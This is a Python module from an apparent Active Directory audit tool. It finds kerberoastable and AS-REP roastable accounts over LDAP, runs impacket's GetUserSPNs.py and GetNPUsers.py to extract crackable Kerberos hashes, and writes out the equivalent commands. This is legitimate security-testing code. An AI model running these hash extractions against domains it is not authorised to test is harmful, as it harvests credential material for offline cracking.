"""Kerberoasting and AS-REP roasting checks using impacket CLI tools."""

import subprocess
import shutil
from typing import Dict, List, Optional
from pathlib import Path

from ...utils.logger import get_logger
from ...utils.ldap import LDAPConnection
from ...utils.output import write_csv, write_lines


class RoastingChecker:
    """Checks for Kerberoasting and AS-REP roasting vulnerabilities."""
    
    def __init__(self, ldap_conn: LDAPConnection, output_paths: Dict[str, Path], 
                 domain: Optional[str] = None, username: Optional[str] = None,
                 password: Optional[str] = None, dc_ip: Optional[str] = None,
                 hashes: Optional[str] = None):
        self.ldap = ldap_conn
        self.output_paths = output_paths
        self.logger = get_logger()
        self.base_dn = ldap_conn.config.base_dn
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip or ldap_conn.config.server
        self.hashes = hashes
    
    def check_roasting(self):
        """Run all roasting-related checks."""
        self._check_kerberoastable_privileged()
        self._check_kerberoastable_users()
        self._check_asrep_roastable()
    
    def _check_kerberoastable_privileged(self):
        """Check for kerberoastable privileged users (adminCount=1)."""
        self.logger.info("---Checking kerberoastable privileged users---")
        
        try:
            users = self.ldap.query(
                search_base=self.base_dn,
                search_filter='(&(objectCategory=person)(objectClass=user)(adminCount=1)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
                attributes=['sAMAccountName', 'servicePrincipalName', 'memberOf']
            )
            
            filepath = self.output_paths['findings'] / 'administrators_serviceprincipalname.txt'
            
            if users:
                count = len(users)
                self.logger.finding(f"There are {count} kerberoastable privileged users")
                write_csv(users, filepath)
            else:
                self.logger.success("[+] No kerberoastable privileged users found")
                
        except Exception as e:
            self.logger.error(f"[-] Error checking kerberoastable privileged users: {e}")
    
    def _check_kerberoastable_users(self):
        """Check for all kerberoastable users and request TGS tickets."""
        self.logger.info("---Checking kerberoastable users---")
        
        try:
            users = self.ldap.query(
                search_base=self.base_dn,
                search_filter='(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(sAMAccountName=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
                attributes=['sAMAccountName', 'servicePrincipalName']
            )
            
            spn_file = self.output_paths['findings'] / 'users_serviceprincipalname.txt'
            hashes_file = self.output_paths['data'] / 'roasting' / 'users_kerberoast_hashes.txt'
            
            # Create roasting directory if needed
            hashes_file.parent.mkdir(parents=True, exist_ok=True)
            
            if users:
                count = len(users)
                self.logger.finding(f"There are {count} kerberoastable users")
                write_csv(users, spn_file)
                
                # Request TGS tickets if credentials available
                if self.domain and self.username and (self.password or self.hashes) and self.dc_ip:
                    self._run_getuserspns(hashes_file)
                else:
                    self.logger.info("[+] Provide password to request TGS tickets automatically")
                    cmd = f"# Run: GetUserSPNs.py -request -dc-ip {self.dc_ip or '<DC>'} {self.domain or '<DOMAIN>'}/{self.username or '<USER>'}"
                    if self.password:
                        cmd += f":{self.password}"
                    elif self.hashes:
                        cmd += f" -hashes {self.hashes}"
                    write_lines([cmd], hashes_file)
            else:
                self.logger.success("[+] No kerberoastable users found")
                
        except Exception as e:
            self.logger.error(f"[-] Error checking kerberoastable users: {e}")
    
    def _run_getuserspns(self, output_file: Path):
        """Run GetUserSPNs.py to extract TGS hashes."""
        try:
            getuserspns = shutil.which('GetUserSPNs.py')
            if not getuserspns:
                self.logger.warning("[W] GetUserSPNs.py not found in PATH")
                return
            
            self.logger.info("[+] Running GetUserSPNs.py to extract hashes...")
            
            cmd = [
                getuserspns,
                '-request',
                '-dc-ip', self.dc_ip,
                '-outputfile', str(output_file)
            ]
            
            if self.hashes:
                cmd.extend(['-hashes', self.hashes])
            
            # Build target: domain/username:password or domain/username with -no-pass
            target = f"{self.domain}/{self.username}"
            if self.password and not self.hashes:
                target = f"{target}:{self.password}"
            
            cmd.append(target)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            # Debug: show raw GetUserSPNs.py output
            self.logger.debug(f"GetUserSPNs.py stdout:\n{result.stdout}")
            self.logger.debug(f"GetUserSPNs.py stderr:\n{result.stderr}")
            
            hashes_found = []
            
            # Check output file first
            if output_file.exists():
                content = output_file.read_text().strip()
                hashes_found = [h for h in content.split('\n') if h and '$krb5tgs$' in h]
            
            # If no hashes in file, check stdout (some versions output there)
            if not hashes_found and result.stdout:
                hashes_found = [h for h in result.stdout.split('\n') if '$krb5tgs$' in h]
                if hashes_found:
                    # Write stdout hashes to file
                    with open(output_file, 'w') as f:
                        f.write('\n'.join(hashes_found))
            
            if hashes_found:
                self.logger.warning(f"[W] Extracted {len(hashes_found)} TGS hashes")
                print(f"[*] Hashes saved to {output_file}")
            elif result.returncode == 0:
                self.logger.info("[+] No TGS hashes extracted (may need different credentials)")
            else:
                if "no entries" in result.stderr.lower() or "0 entries" in result.stdout.lower():
                    self.logger.info("[+] No kerberoastable entries found")
                else:
                    self.logger.warning(f"[W] GetUserSPNs.py: {result.stderr.strip() or result.stdout.strip()}")
                
        except subprocess.TimeoutExpired:
            self.logger.warning("[W] GetUserSPNs.py timed out")
        except Exception as e:
            self.logger.error(f"[-] Error running GetUserSPNs.py: {e}")
    
    def _check_asrep_roastable(self):
        """Check for AS-REP roastable users and request AS-REPs."""
        self.logger.info("---Checking AS-REP roastable users (DONT_REQ_PREAUTH)---")
        
        try:
            users = self.ldap.query(
                search_base=self.base_dn,
                search_filter='(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
                attributes=['sAMAccountName', 'userAccountControl']
            )
            
            users_file = self.output_paths['findings'] / 'users_dontrequirepreauth.txt'
            hashes_file = self.output_paths['data'] / 'roasting' / 'users_asrep_roast_hashes.txt'
            
            # Create roasting directory if needed
            hashes_file.parent.mkdir(parents=True, exist_ok=True)
            
            if users:
                count = len(users)
                self.logger.finding(f"There are {count} users with DONT_REQ_PREAUTH")
                names = [u.get('sAMAccountName', '') for u in users if u.get('sAMAccountName')]
                write_lines(names, users_file)
                
                if self.dc_ip and self.domain:
                    self._run_getnpusers(hashes_file, users)
                else:
                    write_lines([f"# Run: GetNPUsers.py -request -dc-ip {self.dc_ip or '<DC>'} {self.domain or '<DOMAIN>'}/"], hashes_file)
            else:
                self.logger.success("[+] No AS-REP roastable users found")
                
        except Exception as e:
            self.logger.error(f"[-] Error checking AS-REP roastable users: {e}")
    
    def _run_getnpusers(self, output_file: Path, users: List[Dict]):
        """Run GetNPUsers.py to extract AS-REP hashes."""
        try:
            getnpusers = shutil.which('GetNPUsers.py')
            if not getnpusers:
                self.logger.warning("[W] GetNPUsers.py not found in PATH")
                return
            
            self.logger.info("[+] Running GetNPUsers.py to extract AS-REP hashes...")
            
            # Write users to temp file
            usernames = [u.get('sAMAccountName', '') for u in users if u.get('sAMAccountName')]
            users_file = self.output_paths['data'] / 'asrep_users.txt'
            write_lines(usernames, users_file)
            
            cmd = [
                getnpusers,
                '-request',
                '-dc-ip', self.dc_ip,
                '-format', 'hashcat',
                '-outputfile', str(output_file),
                '-usersfile', str(users_file),
                f"{self.domain}/"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            # Debug: show raw GetNPUsers.py output
            self.logger.debug(f"GetNPUsers.py stdout:\n{result.stdout}")
            self.logger.debug(f"GetNPUsers.py stderr:\n{result.stderr}")
            
            if result.returncode == 0 or result.returncode == 1:  # 1 = no users found
                if output_file.exists():
                    content = output_file.read_text().strip()
                    hashes = [h for h in content.split('\n') if h and not h.startswith('#')]
                    if hashes:
                        self.logger.warning(f"[W] Extracted {len(hashes)} AS-REP hashes")
                        print(f"[*] Hashes saved to {output_file}")
                    else:
                        self.logger.info("[+] No AS-REP hashes extracted")
            else:
                self.logger.warning(f"[W] GetNPUsers.py: {result.stderr.strip()}")
                
        except subprocess.TimeoutExpired:
            self.logger.warning("[W] GetNPUsers.py timed out")
        except Exception as e:
            self.logger.error(f"[-] Error running GetNPUsers.py: {e}")
